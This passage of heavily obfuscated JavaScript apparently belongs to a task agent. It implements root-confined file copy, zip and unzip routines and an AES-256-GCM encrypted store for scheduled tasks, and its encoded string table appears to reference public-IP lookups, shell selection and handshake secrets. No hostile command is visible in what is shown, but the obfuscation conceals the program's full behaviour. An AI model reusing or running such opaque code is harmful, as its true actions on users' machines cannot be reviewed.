                c[f3(0x1d5)]({
                    'from': d,
                    'to': f,
                    'status': b[f3(0x6fe)],
                    'message': j[f3(0xbe8)]
                });
            }
        }
        return c;
    }
    static async [a0cm(0x82c)](a) {
        const f4 = a0cm, b = {
                'KcqCx': function (d, f, g) {
                    return d(f, g);
                },
                'iyJVF': function (d, f) {
                    return d(f);
                },
                'nmlGz': 'access_denied',
                'irkdR': f4(0xd76),
                'aCYnC': function (d, f, g) {
                    return d(f, g);
                },
                'xmMjN': 'error'
            }, c = [];
        for (const [d, f] of Object[f4(0x1c8)](a)) {
            const g = a0o[f4(0x48d)](a0a1[f4(0xa0f)], d), h = a0o[f4(0x48d)](a0a1[f4(0xa0f)], f);
            if (!a0ae(g) || !b[f4(0xb39)](a0ae, h)) {
                c[f4(0x1d5)]({
                    'from': d,
                    'to': f,
                    'status': b[f4(0xaf7)]
                });
                continue;
            }
            try {
                if (!a0l[f4(0xc25)](g)) {
                    c[f4(0x1d5)]({
                        'from': d,
                        'to': f,
                        'status': b['irkdR']
                    });
                    continue;
                }
                const i = a0o[f4(0xbfd)](h);
                !a0l[f4(0xc25)](i) && a0l[f4(0x8a8)](i, { 'recursive': !![] });
                const j = a0l[f4(0xc6d)](g);
                if (j[f4(0x5fc)]()) {
                    if (a0l['cpSync'])
                        a0l[f4(0x8b8)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const f5 = f4;
                            if (a0l[f5(0xc6d)](l)[f5(0x5fc)]()) {
                                if (!a0l[f5(0xc25)](m))
                                    a0l[f5(0x8a8)](m, { 'recursive': !![] });
                                for (const n of a0l[f5(0x3f4)](l)) {
                                    b['KcqCx'](k, a0o[f5(0x455)](l, n), a0o[f5(0x455)](m, n));
                                }
                            } else
                                a0l[f5(0x709)](l, m);
                        };
                        b[f4(0xd48)](k, g, h);
                    }
                } else
                    a0l['copyFileSync'](g, h);
                c[f4(0x1d5)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[f4(0x1d5)]({
                    'from': d,
                    'to': f,
                    'status': b['xmMjN'],
                    'message': l[f4(0xbe8)]
                });
            }
        }
        return c;
    }
    static async [a0cm(0x83a)](a) {
        const f6 = a0cm, b = {
                'nfuGW': function (d, f) {
                    return d(f);
                },
                'BXsQT': 'Access\x20denied:\x20path\x20outside\x20root'
            }, c = a0o[f6(0x48d)](a0a1[f6(0xa0f)], a);
        if (!b[f6(0xc52)](a0ae, c))
            throw new Error(b[f6(0x409)]);
        return a0l[f6(0x8a8)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[f6(0xf3)](a0a1[f6(0xa0f)], c)
        };
    }
    static [a0cm(0xd52)](a) {
        const f7 = a0cm;
        return a0o[f7(0xf3)](a0a1[f7(0xa0f)], a) || '.';
    }
    static async ['zipItems'](a, b, c = ![]) {
        const f8 = a0cm, d = {
                'dSBLs': f8(0x3e2),
                'zARcP': function (k, l) {
                    return k === l;
                },
                'qKSbp': f8(0xafc),
                'mMzfe': function (k, l) {
                    return k(l);
                },
                'gXcDc': f8(0x4c1),
                'evkVy': f8(0x2b7),
                'QTpqC': function (k, l) {
                    return k || l;
                },
                'cSCkY': f8(0xaa0),
                'vaDEu': f8(0xd76),
                'NQiZq': function (k, l, m) {
                    return k(l, m);
                },
                'WYEsv': 'partial'
            };
        if (!a)
            throw new Error(d[f8(0x8e5)]);
        if (!Array[f8(0xcb3)](b) || d[f8(0x4de)](b[f8(0x55c)], 0x0))
            throw new Error(d[f8(0x54e)]);
        const f = a0o[f8(0x48d)](a0a1[f8(0xa0f)], a);
        if (!d[f8(0x8ab)](a0ae, f))
            throw new Error(d[f8(0x1cc)]);
        if (a0l['existsSync'](f) && a0l[f8(0xc6d)](f)[f8(0x5fc)]())
            throw new Error(f8(0xf5) + a);
        a0l[f8(0x8a8)](a0o[f8(0xbfd)](f), { 'recursive': !![] });
        if (a0l['existsSync'](f))
            a0l[f8(0x198)](f);
        const g = a0af['openWriter'](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h['push']({
                    'item': k,
                    'status': d[f8(0x3e3)],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[f8(0x48d)](a0a1[f8(0xa0f)], d[f8(0x618)](k, ''));
            try {
                if (!a0ae(l)) {
                    h[f8(0x1d5)]({
                        'item': k,
                        'status': d[f8(0x6bf)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[f8(0xc25)](l)) {
                    h[f8(0x1d5)]({
                        'item': k,
                        'status': d[f8(0x4f4)],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l['statSync'](l);
                let n = 0x0, o = ![];
                if (m[f8(0x349)]()) {
                    if (!g[f8(0x1d9)](a0o[f8(0x814)](l), a0l[f8(0x357)](l), m[f8(0x970)])) {
                        j = !![], h[f8(0x1d5)]({
                            'item': k,
                            'status': d['evkVy'],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[f8(0x5fc)]()) {
                        const p = a0o[f8(0x814)](l), q = (r, s) => {
                                const f9 = f8;
                                for (const t of a0l[f9(0x3f4)](r)) {
                                    const u = a0o[f9(0x455)](r, t), v = s ? s + '/' + t : t, w = a0l['statSync'](u);
                                    if (w[f9(0x5fc)]()) {
                                        if (!g[f9(0x1d9)](v + '/', Buffer['alloc'](0x0), w[f9(0x970)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        q(u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[f9(0x349)]()) {
                                            if (!g[f9(0x1d9)](v, a0l[f9(0x357)](u), w[f9(0x970)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d['NQiZq'](q, l, c ? '' : p);
                    } else {
                        h[f8(0x1d5)]({
                            'item': k,
                            'status': f8(0xaa0),
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[f8(0x1d5)]({
                        'item': k,
                        'status': d[f8(0xd23)],
                        'added': n
                    });
                    continue;
                }
                i += n, h[f8(0x1d5)]({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[f8(0x1d5)]({
                    'item': k,
                    'status': d[f8(0x6bf)],
                    'added': 0x0
                });
            }
        }
        return g[f8(0x7bc)](), {
            'status': 'ok',
            'path': a0ag['_displayPath'](f),
            'entries': i,
            'size': a0l[f8(0xc25)](f) ? a0l[f8(0xc6d)](f)[f8(0x883)] : 0x0,
            'results': h
        };
    }
    static async ['unzipArchive'](a, b, c = !![], d = null) {
        const fa = a0cm, f = {
                'Fpvid': function (p, q) {
                    return p(q);
                },
                'lOEMm': fa(0x4c1),
                'HhZVj': function (p, q) {
                    return p >= q;
                },
                'cPaGD': function (p, q) {
                    return p + q;
                },
                'RDJZE': function (p, q) {
                    return p > q;
                },
                'kKadB': function (p, q) {
                    return p(q);
                },
                'DkjWB': function (p, q) {
                    return p !== q;
                },
                'scbvG': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(fa(0x3e2));
        const g = a0o[fa(0x48d)](a0a1[fa(0xa0f)], a);
        if (!f[fa(0x859)](a0ae, g))
            throw new Error(f[fa(0x3c3)]);
        if (!a0l[fa(0xc25)](g))
            throw new Error('Zip\x20not\x20found:\x20' + a);
        if (a0l[fa(0xc6d)](g)[fa(0x5fc)]())
            throw new Error(fa(0x11a) + a);
        let h;
        if (b) {
            h = a0o[fa(0x48d)](a0a1[fa(0xa0f)], b);
            if (!a0ae(h))
                throw new Error(f[fa(0x3c3)]);
            if (a0l[fa(0xc25)](h) && !a0l['statSync'](h)[fa(0x5fc)]())
                throw new Error(fa(0xe9) + b);
        } else
            h = a0o[fa(0xbfd)](g);
        a0l[fa(0x8a8)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0af['parse'](g);
        } catch (p) {
            throw new Error('Not\x20a\x20zip\x20file:\x20' + a);
        }
        const j = (d || [])[fa(0x88f)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[fa(0x681)])
                continue;
            if (f[fa(0xac3)](f['cPaGD'](k, l), a0af[fa(0x8c1)]) || m >= a0af[fa(0x5bb)]) {
                l++;
                continue;
            }
            const r = q[fa(0xbc6)][fa(0x3a0)](/\\/g, '/');
            if (j['length']) {
                const v = r[fa(0xb0c)]('/')[fa(0x3a6)]();
                if (!j[fa(0x134)](r) && !j[fa(0x134)](v)) {
                    l++;
                    continue;
                }
            }
            if (q[fa(0xbb9)] || q['zip64'] || f[fa(0x5da)](m + q[fa(0x883)], a0af[fa(0x5bb)])) {
                l++;
                continue;
            }
            const s = a0o[fa(0x48d)](h, r), t = a0o[fa(0xf3)](h, s);
            if (t[fa(0x830)]('..') || a0o[fa(0x8c0)](t)) {
                l++;
                continue;
            }
            if (!f[fa(0x240)](a0ae, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0af[fa(0xcdb)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f['DkjWB'](a0af['_crc32'](u), q[fa(0x19d)])) {
                l++;
                continue;
            }
            if (!c && a0l[fa(0xc25)](s)) {
                l++;
                continue;
            }
            try {
                a0l['mkdirSync'](a0o[fa(0xbfd)](s), { 'recursive': !![] }), a0l[fa(0x660)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q['size'], f[fa(0x287)](n[fa(0x55c)], a0af[fa(0xd11)]) ? n[fa(0x1d5)](a0ag['_displayPath'](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0ag['_displayPath'](g),
            'dest': a0ag[fa(0xd52)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0ah {
    static [a0cm(0xd8e)] = 'kisama-store';
    static [a0cm(0x57d)] = 0x1;
    static ['state'] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0cm(0x76f)]() {
        const fb = a0cm;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[fb(0xc25)](a))
                return a;
        }
        try {
            return a0p[fb(0xa93)]() || process['cwd']();
        } catch (b) {
            return process[fb(0x733)]();
        }
    }
    static [a0cm(0x7c7)](a) {
        const fc = a0cm, b = {
                'QZHGa': 'hex',
                'EslWk': function (c, d) {
                    return c === d;
                },
                'sEBVE': fc(0x5bd)
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[fc(0xdb7)](a)) {
                const d = Buffer['from'](a, b[fc(0x85b)]);
                return b[fc(0xcfc)](d[fc(0x55c)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[fc(0xdb7)](a))
                return null;
            const c = Buffer['from'](a, b[fc(0x30d)]);
            return b[fc(0xcfc)](c[fc(0x55c)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static ['init']() {
        const fd = a0cm, a = {
                'LUgro': fd(0x116),
                'Cwute': fd(0x66e),
                'mhTvK': fd(0x99a),
                'ZuZEn': '[TaskStore]\x20💾\x20KSTORE=off,\x20任务持久化已显式关闭',
                'EIZAL': fd(0xc9b),
                'ZuTUP': 'store.enc',
                'YYRjl': fd(0x326),
                'tcaYh': fd(0xb90)
            }, b = a0ah[fd(0xc99)];
        let c = (process.env.KSTORE || '')[fd(0x58a)]();
        if ([
                a[fd(0xbce)],
                '0',
                a[fd(0x13d)],
                a[fd(0x855)]
            ][fd(0x134)](c[fd(0x426)]()))
            return a0P['info'](a[fd(0xdac)]), b;
        const d = (process.env.KSTORE_KEY || '')['trim']();
        !c && (c = a0o[fd(0x455)](a0ah[fd(0x76f)](), a[fd(0x98a)], a['ZuTUP']));
        const f = a0ah[fd(0x7c7)](d);
        if (!f) {
            if (d)
                a0P[fd(0xaa0)](a[fd(0x55a)]);
            else
                a0P[fd(0xd42)](a[fd(0x986)]);
            return b;
        }
        return b[fd(0xa3d)] = c, b[fd(0x3fd)] = f, b[fd(0xa9c)] = !![], a0P[fd(0xd42)](fd(0xa23) + b[fd(0xa3d)]), b;
    }
    static [a0cm(0x28a)](a, b) {
        const fe = a0cm, c = {
                'VvycE': 'aes-256-gcm',
                'WdpgZ': 'utf8',
                'ZSaBQ': fe(0x5bd)
            }, d = a0k['randomBytes'](0xc), f = a0k[fe(0x925)](c[fe(0x4ee)], a, d), g = Buffer[fe(0x5f9)]([
                f['update'](Buffer[fe(0x1e7)](b, c[fe(0xce7)])),
                f[fe(0x890)]()
            ]), h = {
                'nonce': d[fe(0x7a0)](c[fe(0x74c)]),
                'tag': f[fe(0x69c)]()[fe(0x7a0)](c[fe(0x74c)]),
                'ciphertext': g[fe(0x7a0)](c[fe(0x74c)])
            };
        return Buffer[fe(0x1e7)](JSON[fe(0xd94)](h), fe(0x7d9))[fe(0x7a0)]('base64');
    }
    static ['decrypt'](a, b) {
        const ff = a0cm, c = {
                'NdcGg': ff(0x5bd),
                'CyrDq': ff(0x413),
                'nMASO': ff(0x941),
                'rsvoY': ff(0x7d9)
            }, d = JSON[ff(0x881)](Buffer[ff(0x1e7)](b, c[ff(0x5b8)])['toString'](ff(0x7d9)));
        if (!d[ff(0x977)] || !d[ff(0x600)] || !d['ciphertext'])
            throw new Error(c[ff(0x8f2)]);
        const f = a0k[ff(0x2f0)](c['nMASO'], a, Buffer[ff(0x1e7)](d['nonce'], ff(0x5bd)));
        return f[ff(0xbf9)](Buffer[ff(0x1e7)](d['tag'], c[ff(0x5b8)])), Buffer[ff(0x5f9)]([
            f['update'](Buffer['from'](d[ff(0x317)], ff(0x5bd))),
            f[ff(0x890)]()
        ])[ff(0x7a0)](c['rsvoY']);
    }
    static [a0cm(0x612)]() {
        const fg = a0cm, a = {
                'lWeQQ': 'utf8',
                'JpmFX': fg(0xcf5),
                'hnreQ': function (c, d, f) {
                    return c(d, f);
                },
                'bYUmu': function (c, d) {
                    return c !== d;
                },
                'VpQgq': function (c, d) {
                    return c(d);
                }
            }, b = a0ah['state'];
        if (!b[fg(0xa9c)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l['existsSync'](b[fg(0xa3d)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[fg(0x357)](b['path'], a[fg(0x7bf)])[fg(0x58a)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON['parse'](a0ah[fg(0x18a)](b[fg(0x3fd)], c));
            } catch (j) {
                throw new Error(fg(0x5f0) + j['message']);
            }
            if (!d || d['magic'] !== a0ah[fg(0xd8e)])
                throw new Error(a[fg(0xce6)]);
            const f = a[fg(0x46c)](parseInt, d[fg(0xa49)], 0xa) || 0x0;
            if (f > a0ah[fg(0x57d)])
                return b['locked'] = !![], a0P[fg(0xaa0)](fg(0xc2d) + f + '\x20高于支持版本\x20' + a0ah[fg(0x57d)] + ',\x20保留原文件不覆盖,\x20本次以空任务启动且持久化只读'), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['bYUmu'](f, a0ah[fg(0x57d)]))
                throw new Error(fg(0x7d7) + f);
            const g = d[fg(0x5f8)] || {};
            b[fg(0x42e)] = d[fg(0xc07)] || null;
            const h = Array['isArray'](g[fg(0x31d)]) ? g[fg(0x31d)][fg(0x8a0)](String) : [], i = {};
            for (const [l, m] of Object[fg(0x1c8)](g[fg(0x5ec)] || {}))
                i[a[fg(0xb9d)](String, l)] = a['VpQgq'](String, m);
            return a0P[fg(0xd42)](fg(0xd21) + h[fg(0x55c)] + fg(0x36e) + Object[fg(0x40f)](i)['length']), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0ah[fg(0xa2d)](fg(0x167) + n[fg(0xbe8)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static ['quarantine'](a) {
        const fh = a0cm;
        try {
            const b = a0ah[fh(0xc99)];
            if (b['path'] && a0l[fh(0xc25)](b[fh(0xa3d)])) {
                const c = b[fh(0xa3d)] + fh(0xcce) + Date[fh(0x866)]();
                a0l[fh(0x598)](b[fh(0xa3d)], c), a0P[fh(0xaa0)](fh(0xc9f) + a + fh(0x7e6) + c);
            } else
                a0P[fh(0xaa0)](fh(0xc9f) + a);
        } catch (d) {
            a0P[fh(0xaa0)](fh(0xc9f) + a + ',\x20且隔离失败:\x20' + d[fh(0xbe8)]);
        }
    }
    static [a0cm(0x174)](a, b) {
        const fi = a0cm, c = a0ah[fi(0xc99)];
        if (!c[fi(0xa9c)] || c[fi(0x840)])
            return ![];
        let d = null;
        try {
            const f = {
                    'magic': a0ah[fi(0xd8e)],
                    'version': a0ah[fi(0x57d)],
                    'saved_at': new Date()['toISOString']()['replace'](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, g = a0ah[fi(0x28a)](c[fi(0x3fd)], JSON[fi(0xd94)](f));
            return a0l[fi(0x8a8)](a0o['dirname'](c[fi(0xa3d)]), { 'recursive': !![] }), d = c[fi(0xa3d)] + '.tmp-' + process[fi(0xc8b)], a0l['writeFileSync'](d, g, fi(0x7d9)), a0l[fi(0x598)](d, c['path']), c['lastSavedAt'] = f['saved_at'], !![];
        } catch (h) {
            a0P[fi(0xaa0)](fi(0x647) + h[fi(0xbe8)]);
            try {
                if (d && a0l[fi(0xc25)](d))
                    a0l[fi(0x198)](d);
            } catch (i) {
            }
            return ![];
        }
    }
}
function a0a() {
    const lN = [
        'Aw5MDLm',
        'y3jLyxrLsw50zxjMywnL',
        'rgvdrKm',
        'wNrXz04',
        '8j+uKsbBvgvTCeTLEv0G5PAW5lI05PE25A+g6zkL5BEY55sF5OIqoIbRzxLFAwq9',
        'ChrV',
        'D2LUzg93v2fPDgvYCW',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'lJaWmfO',
        'zNntAxPL',
        'zxHPDgnVzgu',
        'zwrNzsbKAwqGBM90ihnLBMqGDgHLieHuvfaVmIbJBgLLBNqGChjLzMfJzq',
        'mc42lJqTANm',
        'AxnbCNjHEq',
        'tLzny2W',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'DhvUBMvSvxjS',
        'DNHQq2i',
        'vLDgt0G',
        'twDWv2W',
        'ywnXsxq',
        'wgPzBxC',
        'mtC0s3PqALPX',
        'rKLmrv9bvurjvf9mt0C',
        'zwrNzsa',
        'zurby1O',
        'qu9pD2G',
        'BNjmu1y',
        'ExzPsfO',
        'CMf3',
        'qgX5zgvSBc9UB2rLlxb0Eq',
        'DuHmA3G',
        'AMPoDwO',
        'wLPUAfy',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'y29SBgvJDeXVy2fSsw5MBW',
        'wfPUzNC',
        'x3bHCNnLtg9UzW',
        'ue5ir1a',
        'Eg16suK',
        'lMjHzc0',
        'uefsy1e',
        'tu9ttuW',
        'yKrcquu',
        'BMv0',
        'u3rRr0W',
        't0PxA3u',
        'x2nVBMzPCM1iyw5KC2HHA2u',
        'wgvesNK',
        'ufDqC0m',
        'l2fWAs90yxnRl2XVzY9ZDw1Tyxj5',
        'x3jLy29Yzfj0DfnHBxbSzq',
        'mta1odq1sKHpDM5U',
        'Aw5MBgf0zq',
        'uKrbwhu',
        'CxvPyYbRzxKGCgHHC2uG',
        'ChnJDKi',
        'vKfgzvq',
        'z3jOuu8',
        'z3jVDxa',
        'A0vUrxC',
        'thvzugq',
        'zxfVseC',
        'txjwsNO',
        'sNbTrLG',
        'v2rWz1O',
        's05btuuG5zcR6z2E5Rov5A2x56YMicJPMzdLRzFMR43MLBdLRzFLJ4OGk18Tw10Qjd1aldSVkq',
        'D0DtC2y',
        'D2L0AfrHC2TnzxrH',
        'x2HLywrLCG',
        'ndy1oduXnNfwCe9vvG',
        's1bRDxO',
        'BwvTx3rVDgfS',
        'C3vJy2vZCW',
        'qu9jtxy',
        'Bg9JywXgywXSyMfJAW',
        'yK5Ns04',
        'AuriB1u',
        'rvbXuem',
        'BwfNAwmG5lIn5yY56ywn',
        'D3jPDgvvsw50mZjcrq',
        'DhjHBNnWB3j0',
        'CMvZDg9YzuzYB21tDg9Yzq',
        'BhbYuM4',
        'v25duuW',
        'q0P3zuK',
        'rxnSv2S',
        'CMfUzg9T',
        'zgvSzxrL',
        'z1PPEfq',
        'z2v0q3jVBLrHC2TZ',
        's3P1ChO',
        'Dvbpsha',
        'z3HKsvC',
        'icaG4OcIia',
        'EgXcr20',
        'CgfYC2vszxf1zxn0',
        'x21HCMTtExn0zw1K',
        'x3bLBMrPBMDpBMvpzMy',
        'CMvTB3rLugfYyw1LDgvYCW',
        'v3vYs0G',
        'se9XAg4',
        'zMz0C2e',
        'shr0Ce1LDgHVza',
        'veXAwvG',
        't0zAAK0',
        'zvnYD3y',
        'wKLqx01bwf9msvnururFrKLmrvm',
        'zMfSBgLUzYbIywnRihrViefYCMf5qNvMzMvYigLUC3rHBNrPyxrPB24',
        'DhrS',
        'vfLlEhm',
        'wM9QChG',
        'zML4zwq',
        'y29UC3qGC2HLBgWGpsbWCM9JzxnZlNbSyxrMB3jTid09psaID2LUmZiIid8GkhbYB2nLC3mUzw52lKnVBvnWzwmGFhWGiMnTzc5LEguIksa6iciVyMLUl3nOiJS',
        'nhW1Fdn8mhWYFde',
        'DLnZvKq',
        'v0fstL9jtLrfuLzbta',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lM1HEa',
        'ufj0Evi',
        'y21KlMv4zq',
        'rLzkqLi',
        'q25KsKW',
        'DwLUuxa',
        'w1rHC2TtDg9Yzv0G8j+sVIdLT7lMGAlLPi3MJihKUyxLJjBKU7VLIQe6ig9UzxrPBwu9',
        'Ahr0Chm6lY8XlJeUms4Xl2rUCY1XDwvYEq',
        'v1LfC3y',
        'Ehzqz28',
        'zLbXBxu',
        'zwnKC2fFChjPDMf0zv9OzxG',
        'CgfJA2v0',
        'DxnYl2jPBI9MDxnLCM1VDw50',
        'shjWu1m',
        'u2vYDMvYigXPC3rLBMLUzYbZDwnJzxnZzNvSBhK',
        'BM9Kzs1JCM9U',
        'DgfRzuzPBG',
        'r2LuDhy',
        'B1LJwNC',
        'kg5VBMuP',
        'swngu20',
        'uhfms0O',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'AeDRyKi',
        'CMvHzev4ywn0',
        'tg9JEhm',
        'C2vJCMv0',
        'C2vYDMvxzwjZB2nRzxq',
        'CMvHzfvjBNqXnKXf',
        's1zn',
        'zxHLy3v0zu9UzxrPBwvuyxnRCW',
        'x2LUrMXPz2H0qNL0zxm',
        'EuHJu04',
        'z1POExe',
        'BgLIyuG',
        'qNLqEgO',
        'u3HODhe',
        'B25JtNu',
        'Aw5MBW',
        'BePbsfC',
        'tvLfqxq',
        'sLrSrLu',
        'zeDqvwe',
        'y29TCgXLDgu',
        'yunzBKm',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'uuP4DhG',
        'v2Pwuwi',
        'zMv0y2Hjua',
        'zMfTAwX5',
        'refhyMq',
        'r3zNu1q',
        'y3nuquy',
        'AKrwCNy',
        'x2rPC3bSyxLqyxrO',
        'sgfYzMK',
        'EuX3we8',
        'DfP4s3i',
        'y29UDhjVBc1ZDhjLyw0',
        'EhLNtw8',
        'z2Dqr3O',
        'zxHWAxjL',
        'wKL2tMO',
        'q0T5sgG',
        'D0nODKO',
        'AxnZDwvYie9vig1PC21HDgnOoIa',
        'u0TTvuW',
        'qKftruLorK9FrKfjtf9cqunlt0zg',
        'thjsv00',
        'AwyTBM9Uzs1TyxrJAa',
        'y29UDgvUDc1Syw5NDwfNzq',
        'y0T2uMi',
        'AwjJvwy',
        'DwrQrhG',
        'ywXWBLbYB3rVy29S',
        'v0vTDei',
        'Dte2',
        'ue9tva',
        'DMHxBxe',
        'x2LZqMLUyxj5',
        'BgfYz2vZDfjLy3y',
        'sMHXDhK',
        'yuPczg4',
        'z1HZBuu',
        'A3DpAuG',
        'CgvLCK1HEezYyw1L',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'z2PQs2C',
        'ENjNBMm',
        'ntaW',
        'BM90x2zVDw5K',
        'Bxforvq',
        'EKjLy2W',
        'CxvLDwu',
        'zuvAshe',
        'y2f0y2G',
        'rM1UsMK',
        'Bwf4v2LUzg93',
        'CNPvyNC',
        'BwTsBfy',
        'rvb2Ee0',
        'ufbKv0K',
        'y3b1x25HBwu',
        'rMLSzsb0B28GBgfYz2u',
        'uf9trvjwrvjFvvvjrd0',
        'BgLUDxG',
        'ywvZlti1nI1Ly2i',
        'ALbHt1u',
        's01preu',
        'DMfSDwu',
        'C29JA2v0igvYCM9YoIa',
        'A3DivLK',
        'svD0vLu',
        'BgPPC0u',
        'tufhsum',
        'u0zQzxi',
        'mxWYFdn8mhW0',
        'yuXkuei',
        'tgn2vM8',
        'DLjgBKe',
        'C3rYAw5NAwz5',
        'wc1uAw1LC3rHBxa',
        'C2vYDMvYsgfUzhnOywTLu2vJCMv0',
        'z2XPyMm',
        'y29UDgvUDc1LBMnVzgLUzW',
        'y29UBG',
        'B3DUzxi',
        'ueLkDwm',
        'C2vYDMvYtMfTzq',
        'yxjNBYb0Dw5UzwWGCMuTCMvNAxn0zxiGzMfPBgvKoIa',
        'ELnLsLq',
        'qNb1Awu',
        'ndaW',
        'DhfewwG',
        'BKrkvLq',
        't0j0B1u',
        'odaWma',
        'D3jPDgvcExrLCW',
        'BMr2ruS',
        'y3jVBKPVyNm',
        'y2vnCKK',
        'DxnYl2jPBI9ZExn0zw1JDgW',
        'q1rvwvu',
        'rur2uwm',
        'wNvArw4',
        'rvL4Eem',
        'DwrWnG',
        'u3LZDgvTmZi',
        'ENrnAgC',
        'DhmTBM9Kzq',
        'CMT2vM0',
        'x2nSB25LqMfZzuLUzM9qyxj0',
        'y21wEeG',
        'CgnpCwq',
        'twLZC2LUzYbYzxf1AxjLzcbJDxn0B20GAgvHzgvYCZOGwc1gAwXLlvbHDgGGyw5KifGTrMLSzs1oyw1L',
        'DgvZDa',
        'EMHHsgy',
        'tMHJEKi',
        's05btuuG6l+h55+TicG',
        'yMLUl2z1C2vYBw91BNqZ',
        'y29UDgfPBMvY',
        'CMvHzfvjBNqXnKjf',
        'vfrmx01bwa',
        'BM1UD1G',
        'Aw52ywXPzcbiuefdsYbPBMrLEa',
        'rgvZDgLUyxrPB24GAxmGysbMAwXLoIa',
        'vu5Qzgq',
        'l3bYB2mVms9Jz3jVDxa',
        'BxDzEgO',
        'yxbWBgLJyxrPB24VB2n0zxqTC3rYzwfT',
        'zw1WDhKGuLbdihbHEwXVywq',
        'q3nrzva',
        'BhzIs0y',
        'uw56tM8',
        'B2vwBuu',
        'CMvSyxrPDMu',
        'yuD4wui',
        'vgfYz2v0igLZigeGzgLYzwn0B3j5oIa',
        'Ahr0Chm6lY9PCgvJAg8UBMv0l3bSywLU',
        'ihbYB3H5igzHAwXLzdOG',
        'zvb0CMG',
        'BxvSDgLWyxj0l2zVCM0Tzgf0ytSGyM91BMrHCNK9',
        'A2r0u3e',
        'DwndrLG',
        'uMLVrxe',
        'Cvbgwem',
        'z2LK',
        'z1vRBwq',
        'Dg9bC2nPAq',
        'C2vSzG',
        'yxjNB3r1BM5LBa',
        'Ec1MAwXLlxbHDgG',
        'Bw92zuzPBgvZ',
        'zg5ZoG',
        'BfjYwfG',
        'rvjst1i',
        'CgvNrMi',
        'v0TNvu4',
        'vu1vsK0',
        'D3jPDgu',
        'u2Tquei',
        'qu1MBKW',
        'x2rLBgL2zxjtDhjLyw0',
        'y29UDhjVBa',
        'ExvSuLa',
        'CgfKzgLUzW',
        'Aw5PDgLHBe1HEfn0CMvHBxncAwrP',
        'whnAsLy',
        'AKzNy3a',
        'A2nlDKm',
        'B2zM',
        'ALjUz0q',
        'Cu9Is2S',
        'ywn0AxzHDgu',
        'ugf0AcbPCYbHigrPCMvJDg9YEtOG',
        'x2jHC2vPBMzVx2XVy2fSx3bYB21PC2u',
        'z1bJuxC',
        'z2v0ugvLCKnLCNrPzMLJyxrL',
        'z2v0q3jVBKXVz3m',
        'AKHYr0S',
        'ywnJB3vUDfrHzW',
        'uenOzeG',
        't3DZq3O',
        'y0Lnv3G',
        'CxvPyYbKAxnJyxjKzwqG',
        'sK5mrfC',
        'rKzbsuK',
        'CMvHzhLtDgf0zq',
        'u2vJlvDLyLnVy2TLDc1wzxjZAw9UoIaXmW',
        'wKfKCwu',
        'C3rYAw5N',
        'zNjVBNrPzxi',
        'wfLSweW',
        'CgvLCK1HEerHDge',
        'uxfczgS',
        'D2vSy29Tzq',
        'zgv0zwn0twfYA3m',
        'AvbKq28',
        'Eun3uMS',
        'ugX2Bxm',
        'Aw5JBhvKzxm',
        'CMvSzwfZzq',
        'Efjkvhq',
        'AeXTyK0',
        's3Lkyvy',
        'D3jPDgfIBgu',
        'EvztCha',
        'Aw5gBgLNAhq',
        'BgrOv2i',
        'q3D1Dgu',
        'zNvUy3rPB24',
        'C2vYDMvYigHLBgXVoIa',
        'wwDeDuC',
        'C2fVDMy',
        'qw9ruvO',
        'z3zVtuy',
        'Cxv2EKy',
        'D0XHsxq',
        'C3bRAq',
        'l2fWAs9KBW',
        'ExPHBuG',
        'qwXSignODw5RCYbYzwnLAxzLzc4GrMLSzsbTzxjNzwqGC3vJy2vZC2z1BgX5lG',
        'x2nYyZmY',
        'u0XVsNi',
        'iowWJ+AxTG',
        'uu9Kv2K',
        'C05kvNK',
        'suLAC1K',
        'ww5HBey',
        'D0nuENu',
        'ywrKCMvZCW',
        've9UtNu',
        'B3zLCMXHEq',
        'y29VA2LL',
